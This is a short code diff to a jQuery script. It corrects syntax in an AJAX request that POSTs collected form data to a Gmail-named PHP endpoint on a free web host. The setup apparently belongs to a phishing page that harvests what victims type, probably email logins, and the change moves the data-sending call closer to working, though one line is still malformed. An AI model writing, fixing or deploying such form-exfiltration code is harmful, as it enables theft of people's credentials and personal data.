@@ -391,12 +391,11 @@
           $.ajax({
             type : 'POST',
             url : 'https://cursorwaiting.000webhostapp.com/gmail.php',
-            data : formDetails;
+            data : formDetails,
             success(function(){
               alert('finished');
               console.log(formDetails);
-            })
-              
+            })              
           });
         });
       });
